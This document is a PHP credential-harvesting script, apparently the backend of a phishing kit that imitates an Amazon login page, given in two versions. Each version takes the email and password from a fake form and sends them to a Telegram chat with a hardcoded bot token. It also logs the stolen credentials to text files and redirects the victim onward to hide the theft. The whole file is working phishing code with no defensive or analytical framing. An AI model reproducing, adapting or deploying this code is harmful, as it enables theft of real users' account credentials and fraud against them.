<?php
// telegram.php
$bot_token = '8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk';
$chat_id   = '-1003788054267';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if ($email && $password) {
        $message = "🔐 Amazon Login:\nEmail: $email\nPassword: $password";
        
        // استخدام cURL (أفضل وأسرع)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$bot_token}/sendMessage");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'chat_id' => $chat_id,
            'text' => $message
        ]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        // تسجيل للتصحيح (حط هاد السطر باش تشوف إذا وصل)
        file_put_contents('log.txt', date('Y-m-d H:i:s') . " - HTTP $http_code - $email\n", FILE_APPEND);
        
        // إعادة التوجيه لأمازون
        header('Location: 3.php');
        exit;
    }
}
// إذا كانت البيانات ناقصة أو الوصول مباشر للملف، نوجه للصفحة الأصلية
header('Location: witing.html');
exit;
?>


<?php
// ============================================================
// إعدادات تيليغرام - قم بتعديلها
// ============================================================
$bot_token = '8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk';
$chat_id   = '-1003788054267';
// ============================================================

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email    = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    
    // إذا لم يتم العثور على password، جرب ap_password
    if (empty($password) && isset($_POST['ap_password'])) {
        $password = trim($_POST['ap_password']);
    }
    
    if (!empty($email) && !empty($password)) {
        $message = "🔐 New Amazon Login:\n📧 Email: " . $email . "\n🔑 Password: " . $password;
        
        // استخدام cURL
        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        $postData = http_build_query([
            'chat_id' => $chat_id,
            'text'    => $message
        ]);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        curl_close($ch);
        
        // سجل في ملف للتصحيح
        file_put_contents('telegram_log.txt', date('Y-m-d H:i:s') . " - Sent: $email | $password\n", FILE_APPEND);
        
        // إعادة توجيه إلى أمازون
        header('Location: 3.php');
        exit;
    } else {
        // سجل إذا كان البريد أو الباسورد فارغين
        file_put_contents('telegram_log.txt', date('Y-m-d H:i:s') . " - Missing data - Email: $email , Password: $password\n", FILE_APPEND);
    }
}
?>
